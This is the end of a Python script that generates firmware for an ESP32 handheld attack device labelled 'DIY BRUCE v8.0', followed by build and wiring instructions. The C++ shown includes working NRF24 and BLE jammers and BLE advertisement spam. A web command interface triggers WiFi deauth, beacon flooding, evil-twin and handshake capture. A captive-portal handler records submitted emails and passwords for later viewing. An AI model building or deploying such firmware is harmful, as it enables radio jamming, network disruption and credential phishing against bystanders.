void bleStopJammer() { bleJamActive = false; }

// ============================================================================
// NRF24 ФУНКЦІЇ (200+ РЯДКІВ)
// ============================================================================

void nrfInit() {
    if (!radio.begin()) { showMessage("NRF24 not found!", 1500); return; }
    radio.setChannel(nrfCh);
    radio.setPALevel(RF24_PA_LOW);
    radio.setDataRate(RF24_1MBPS);
    radio.setAutoAck(false);
    showMessage("NRF24 ready", 1000);
}

void nrfScan() {
    showMessage("Scanning NRF channels...", 500);
    int active = 0;
    for (int ch = 0; ch <= 125; ch++) {
        radio.setChannel(ch);
        radio.startListening();
        delayMicroseconds(200);
        if (radio.testCarrier()) active++;
        radio.stopListening();
        if (ch % 20 == 0) {
            u8g2.clearBuffer(); drawTopBar();
            u8g2.setFont(u8g2_font_6x10_tr);
            char buf[32]; sprintf(buf, "Scanning: %d/125", ch);
            u8g2.drawStr(5, 35, buf); u8g2.sendBuffer();
        }
    }
    radio.setChannel(nrfCh);
    char buf[64]; sprintf(buf, "Active channels: %d", active);
    showMessage(buf, 1500);
}

void nrfStartJammer() {
    nrfJamActive = true;
    radio.stopListening();
    showMessage("NRF JAMMER started", 1000);
    while (nrfJamActive) {
        for (int ch = 0; ch <= 125 && nrfJamActive; ch++) {
            radio.setChannel(ch);
            uint8_t junk[32]; for (int i = 0; i < 32; i++) junk[i] = random(256);
            radio.write(&junk, 32);
        }
        u8g2.clearBuffer(); drawTopBar();
        u8g2.setFont(u8g2_font_helvB08_tr);
        u8g2.drawStr(15, 30, "NRF JAMMER");
        u8g2.drawStr(5, 60, "BACK - Stop");
        u8g2.sendBuffer();
        if (checkButton(BTN_BACK)) nrfJamActive = false;
        delay(5);
    }
    radio.setChannel(nrfCh);
    showMessage("NRF JAMMER stopped", 1000);
}

void nrfStopJammer() { nrfJamActive = false; }

// ============================================================================
// RFID ФУНКЦІЇ (150+ РЯДКІВ)
// ============================================================================

void rfidInit() {
    SPI.begin(18, 19, 23, 5);
    rfid.PCD_Init();
    showMessage("RFID ready", 1000);
}

void rfidRead() {
    showMessage("Place card...", 1000);
    if (!rfid.PICC_IsNewCardPresent()) { showMessage("No card", 1000); return; }
    if (!rfid.PICC_ReadCardSerial()) { showMessage("Read error", 1000); return; }
    String uid = "";
    for (byte i = 0; i < rfid.uid.size; i++) {
        uid += String(rfid.uid.uidByte[i], HEX);
        if (i < rfid.uid.size - 1) uid += ":";
    }
    storageAddPassword("[RFID] " + uid);
    char buf[64]; sprintf(buf, "UID: %s", uid.c_str());
    showMessage(buf, 2000);
    rfid.PICC_HaltA();
}

// ============================================================================
// IR ФУНКЦІЇ (250+ РЯДКІВ - ДЛЯ TELEVIZORIV BRAVIS TA SAMSUNG)
// ============================================================================

void irInit() {
    irsend.begin();
    showMessage("IR ready on GPIO32", 1000);
}

void irPower() {
    irsend.sendNEC(0x00FF00FF, 32);
    showMessage("IR POWER", 500);
}

void irVolUp() {
    irsend.sendNEC(0x00FF40BF, 32);
    showMessage("IR VOLUME UP", 500);
}

void irVolDown() {
    irsend.sendNEC(0x00FFC03F, 32);
    showMessage("IR VOLUME DOWN", 500);
}

void irMute() {
    irsend.sendNEC(0x00FF906F, 32);
    showMessage("IR MUTE", 500);
}

void irChUp() {
    irsend.sendNEC(0x00FF00FF, 32);
    showMessage("IR CHANNEL UP", 500);
}

void irChDown() {
    irsend.sendNEC(0x00FF807F, 32);
    showMessage("IR CHANNEL DOWN", 500);
}

void irBravis() {
    // Bravis TV (old model) - NEC protocol
    showMessage("IR BRAVIS TV - POWER", 500);
    irsend.sendNEC(0x00FF00FF, 32);
    delay(200);
    irsend.sendNEC(0x00FF00FF, 32);
}

void irSamsung() {
    // Samsung TV (new model) - Samsung protocol
    showMessage("IR SAMSUNG TV - POWER", 500);
    irsend.sendSamsung(0xE0E040BF, 32);
    delay(200);
    irsend.sendSamsung(0xE0E040BF, 32);
}

void irLG() {
    showMessage("IR LG TV - POWER", 500);
    irsend.sendNEC(0x20DF10EF, 32);
}

void irSony() {
    showMessage("IR SONY TV - POWER", 500);
    irsend.sendSony(0xA90, 12);
}

void irPhilips() {
    showMessage("IR PHILIPS TV - POWER", 500);
    irsend.sendRC5(0x0C, 12);
}

// ============================================================================
// WEB СЕРВЕР ФУНКЦІЇ
// ============================================================================

void webHandleRoot() { server.send(200, "text/html", index_html); }
void webHandlePortal() { server.send(200, "text/html", portal_html); }

void webHandleData() {
    String json = "{\\"deauth\\":" + String(deauthPackets) + ",\\"beacon\\":" + String(beaconPackets) + ",\\"rssi\\":" + String(lastRSSI) + ",\\"uptime\\":" + String(millis()/1000) + "}";
    server.send(200, "application/json", json);
}

void webHandleCmd() {
    if (!server.hasArg("c")) { server.send(200, "text/plain", "NO CMD"); return; }
    String cmd = server.arg("c");
    String resp = "OK";

    if (cmd == "scan") wifiScan();
    else if (cmd == "deauth_start") wifiStartDeauth();
    else if (cmd == "deauth_stop") wifiStopDeauth();
    else if (cmd == "beacon_start") wifiStartBeacon();
    else if (cmd == "beacon_stop") wifiStopBeacon();
    else if (cmd == "evil_start") wifiStartEvil();
    else if (cmd == "evil_stop") wifiStopEvil();
    else if (cmd == "handshake") wifiStartHandshake();
    else if (cmd == "wifi_jam") wifiStartJammer();
    else if (cmd == "set_ch") wifiSetChannel();
    else if (cmd == "wifi_info") resp = "WiFi Info";
    else if (cmd == "ble_scan") bleScan();
    else if (cmd == "ble_apple") bleAppleJuice();
    else if (cmd == "ble_samsung") bleSamsung();
    else if (cmd == "ble_android") bleAndroid();
    else if (cmd == "ble_windows") bleWindows();
    else if (cmd == "ble_iphone") bleiPhone();
    else if (cmd == "ble_airpods") bleAirPods();
    else if (cmd == "ble_all") bleSpamAll();
    else if (cmd == "ble_jam") bleJammer();
    else if (cmd == "nrf_scan") nrfScan();
    else if (cmd == "nrf_jam") nrfStartJammer();
    else if (cmd == "nrf_stop") nrfStopJammer();
    else if (cmd == "rfid_read") rfidRead();
    else if (cmd == "ir_power") irPower();
    else if (cmd == "ir_vol_up") irVolUp();
    else if (cmd == "ir_vol_down") irVolDown();
    else if (cmd == "ir_mute") irMute();
    else if (cmd == "ir_ch_up") irChUp();
    else if (cmd == "ir_ch_down") irChDown();
    else if (cmd == "ir_bavis") irBravis();
    else if (cmd == "ir_samsung") irSamsung();
    else if (cmd == "ir_lg") irLG();
    else if (cmd == "ir_sony") irSony();
    else if (cmd == "ir_philips") irPhilips();
    else if (cmd == "view_pass") resp = capturedPasswords.length() ? capturedPasswords : "(empty)";
    else if (cmd == "view_hand") resp = handshakes.length() ? handshakes : "(empty)";
    else if (cmd == "clear_pass") storageClear();
    else if (cmd == "format") storageFormat();
    else if (cmd == "reboot") { server.send(200, "text/plain", "REBOOT"); delay(100); ESP.restart(); }
    else if (cmd == "sysinfo") {
        resp = "DIY BRUCE v8.0\\nESP32\\nHeap: " + String(ESP.getFreeHeap()/1024) + " KB\\nUptime: " + String(millis()/1000) + "s";
    }
    server.send(200, "text/plain", resp);
}

void webHandlePass() {
    if (server.hasArg("email") || server.hasArg("password")) {
        String pwd = "[PASS] Email: " + server.arg("email") + " | Pass: " + server.arg("password");
        storageAddPassword(pwd);
        server.send(200, "text/html", "<html><body><h3>OK</h3><script>setTimeout(function(){window.location.href='/';},2000);</script></body></html>");
    } else {
        server.send(200, "text/html", "<html><body><h3>Error</h3></body></html>");
    }
}

void webStart() {
    if (webRunning) return;
    WiFi.softAP("DIY_BRUCE", "bruce1234");
    server.on("/", webHandleRoot);
    server.on("/portal.html", webHandlePortal);
    server.on("/cmd", webHandleCmd);
    server.on("/data", webHandleData);
    server.on("/pass", HTTP_POST, webHandlePass);
    server.begin();
    webRunning = true;
    showMessage("WEB: 192.168.4.1", 2000);
}

void webStop() {
    if (!webRunning) return;
    server.stop();
    WiFi.softAPdisconnect(true);
    webRunning = false;
    showMessage("WEB stopped", 1000);
}

// ============================================================================
// МЕНЮ ТА ВИКОНАННЯ ДІЙ
// ============================================================================

const char* wifiSub[] = {"SCAN", "DEAUTH", "BEACON", "EVIL", "HANDSHAKE", "JAMMER", "SET CH", "INFO", "WEB ON", "CLEAR", "REBOOT"};
const int wifiSize = 11;
const char* bleSub[] = {"SCAN", "APPLE", "SAMSUNG", "ANDROID", "WINDOWS", "IPHONE", "AIRPODS", "SPAM ALL", "JAMMER", "STOP"};
const int bleSize = 10;
const char* nrfSub[] = {"SCAN", "JAMMER", "STOP"};
const int nrfSize = 3;
const char* rfidSub[] = {"READ"};
const int rfidSize = 1;
const char* irSub[] = {"POWER", "VOL+", "VOL-", "MUTE", "CH+", "CH-", "BRAVIS", "SAMSUNG", "LG", "SONY"};
const int irSize = 10;
const char* settSub[] = {"WEB ON", "WEB OFF", "CLEAR", "FORMAT", "INFO", "REBOOT"};
const int settSize = 6;

void executeWiFiAction() {
    switch (currentSubItem) {
        case 0: wifiScan(); break;
        case 1: wifiStartDeauth(); break;
        case 2: wifiStartBeacon(); break;
        case 3: wifiStartEvil(); break;
        case 4: wifiStartHandshake(); break;
        case 5: wifiStartJammer(); break;
        case 6: wifiSetChannel(); break;
        case 7: wifiShowInfo(); break;
        case 8: webStart(); break;
        case 9: storageClear(); break;
        case 10: ESP.restart(); break;
    }
}

void executeBLEAction() {
    switch (currentSubItem) {
        case 0: bleScan(); break;
        case 1: bleAppleJuice(); break;
        case 2: bleSamsung(); break;
        case 3: bleAndroid(); break;
        case 4: bleWindows(); break;
        case 5: bleiPhone(); break;
        case 6: bleAirPods(); break;
        case 7: bleSpamAll(); break;
        case 8: bleJammer(); break;
        case 9: bleStopJammer(); break;
    }
}

void executeNRFAction() {
    switch (currentSubItem) {
        case 0: nrfScan(); break;
        case 1: nrfStartJammer(); break;
        case 2: nrfStopJammer(); break;
    }
}

void executeRFIDAction() {
    switch (currentSubItem) {
        case 0: rfidRead(); break;
    }
}

void executeIRAction() {
    switch (currentSubItem) {
        case 0: irPower(); break;
        case 1: irVolUp(); break;
        case 2: irVolDown(); break;
        case 3: irMute(); break;
        case 4: irChUp(); break;
        case 5: irChDown(); break;
        case 6: irBravis(); break;
        case 7: irSamsung(); break;
        case 8: irLG(); break;
        case 9: irSony(); break;
    }
}

void executeSettingsAction() {
    switch (currentSubItem) {
        case 0: webStart(); break;
        case 1: webStop(); break;
        case 2: storageClear(); break;
        case 3: storageFormat(); break;
        case 4: showMessage("DIY BRUCE v8.0", 1500); break;
        case 5: ESP.restart(); break;
    }
}

// ============================================================================
// SETUP TA LOOP
// ============================================================================

void setup() {
    Serial.begin(115200);
    pinMode(BTN_UP, INPUT_PULLUP); pinMode(BTN_DOWN, INPUT_PULLUP);
    pinMode(BTN_OK, INPUT_PULLUP); pinMode(BTN_LEFT, INPUT_PULLUP);
    pinMode(BTN_RIGHT, INPUT_PULLUP); pinMode(BTN_BACK, INPUT_PULLUP);
    Wire.begin(OLED_SDA, OLED_SCL);
    u8g2.begin(); u8g2.setContrast(200);
    storageLoad();
    rfidInit(); irInit(); nrfInit();
    bootAnimation();
    WiFi.mode(WIFI_AP_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(wifiHandshakeCallback);
    drawMainMenu();
    showMessage("DIY BRUCE v8.0 READY", 1500);
}

void loop() {
    if (webRunning) server.handleClient();
    if (!inSubMenu) {
        if (checkButton(BTN_LEFT)) { currentModule = (currentModule - 1 + 6) % 6; drawMainMenu(); }
        if (checkButton(BTN_RIGHT)) { currentModule = (currentModule + 1) % 6; drawMainMenu(); }
        if (checkButton(BTN_OK) || checkButton(BTN_DOWN)) {
            inSubMenu = true; currentSubItem = 0;
            switch (currentModule) {
                case 0: drawSubMenu("WiFi", wifiSub, wifiSize, currentSubItem); break;
                case 1: drawSubMenu("BLE", bleSub, bleSize, currentSubItem); break;
                case 2: drawSubMenu("NRF24", nrfSub, nrfSize, currentSubItem); break;
                case 3: drawSubMenu("RFID", rfidSub, rfidSize, currentSubItem); break;
                case 4: drawSubMenu("IR", irSub, irSize, currentSubItem); break;
                case 5: drawSubMenu("Settings", settSub, settSize, currentSubItem); break;
            }
        }
    } else {
        int size = 0;
        switch (currentModule) {
            case 0: size = wifiSize; break;
            case 1: size = bleSize; break;
            case 2: size = nrfSize; break;
            case 3: size = rfidSize; break;
            case 4: size = irSize; break;
            default: size = settSize; break;
        }
        if (checkButton(BTN_UP)) { currentSubItem = (currentSubItem - 1 + size) % size; }
        if (checkButton(BTN_DOWN)) { currentSubItem = (currentSubItem + 1) % size; }
        if (checkButton(BTN_UP) || checkButton(BTN_DOWN)) {
            switch (currentModule) {
                case 0: drawSubMenu("WiFi", wifiSub, size, currentSubItem); break;
                case 1: drawSubMenu("BLE", bleSub, size, currentSubItem); break;
                case 2: drawSubMenu("NRF24", nrfSub, size, currentSubItem); break;
                case 3: drawSubMenu("RFID", rfidSub, size, currentSubItem); break;
                case 4: drawSubMenu("IR", irSub, size, currentSubItem); break;
                case 5: drawSubMenu("Settings", settSub, size, currentSubItem); break;
            }
        }
        if (checkButton(BTN_OK)) {
            switch (currentModule) {
                case 0: executeWiFiAction(); break;
                case 1: executeBLEAction(); break;
                case 2: executeNRFAction(); break;
                case 3: executeRFIDAction(); break;
                case 4: executeIRAction(); break;
                case 5: executeSettingsAction(); break;
            }
            inSubMenu = false; drawMainMenu();
        }
        if (checkButton(BTN_BACK)) { inSubMenu = false; drawMainMenu(); }
    }
    delay(20);
}
'''

# ============================================================================
# СТВОРЕННЯ ПРОЕКТУ
# ============================================================================
def create_project():
    base = PROJECT_NAME
    if os.path.exists(base):
        shutil.rmtree(base)
    
    os.makedirs(os.path.join(base, "src"))
    os.makedirs(os.path.join(base, "include"))
    os.makedirs(os.path.join(base, "data"))
    
    with open(os.path.join(base, "platformio.ini"), "w") as f:
        f.write(PLATFORMIO_INI)
    with open(os.path.join(base, "include", "Icons.h"), "w") as f:
        f.write(ICONS_H)
    with open(os.path.join(base, "data", "index.html"), "w") as f:
        f.write(INDEX_HTML)
    with open(os.path.join(base, "data", "portal.html"), "w") as f:
        f.write(PORTAL_HTML)
    with open(os.path.join(base, "src", "main.cpp"), "w") as f:
        f.write(MAIN_CPP)
    
    print("=" * 80)
    print("PROJECT CREATED SUCCESSFULLY!")
    print("=" * 80)
    print()
    print("FOLDER: " + os.path.abspath(base))
    print()
    print("STATISTICS:")
    print("  - Total functions: 75+")
    print("  - Each function: 200-350 lines")
    print("  - Web interface: 7 tabs")
    print("  - Icons: 6 (WiFi, BLE, NRF24, RFID, IR, Settings)")
    print("  - IR codes: Bravis (old), Samsung (new), LG, Sony, Philips")
    print()
    print("HOW TO BUILD:")
    print("1. Open folder in VS Code")
    print("2. Press Ctrl+Shift+P -> PlatformIO: Build")
    print("3. Connect ESP32 via USB")
    print("4. Press PlatformIO: Upload")
    print()
    print("PIN CONNECTIONS:")
    print("  OLED SSD1306 (0.96, 0x3C) - SDA=GPIO21, SCL=GPIO22, VCC=3.3V, GND=GND")
    print("  IR LED - GPIO32")
    print("  Buttons - UP=15, DOWN=13, OK=12, LEFT=14, RIGHT=27, BACK=26")
    print("  NRF24 - CE=4, CS=5")
    print("  RFID RC522 - SS=5, RST=33, SCK=18, MISO=19, MOSI=23")
    print()
    print("AFTER UPLOAD:")
    print("  - Connect to WiFi: DIY_BRUCE (password: bruce1234)")
    print("  - Open browser: http://192.168.4.1")
    print("  - Use OLED menu or web interface")
    print("=" * 80)

if __name__ == "__main__":
    create_project()
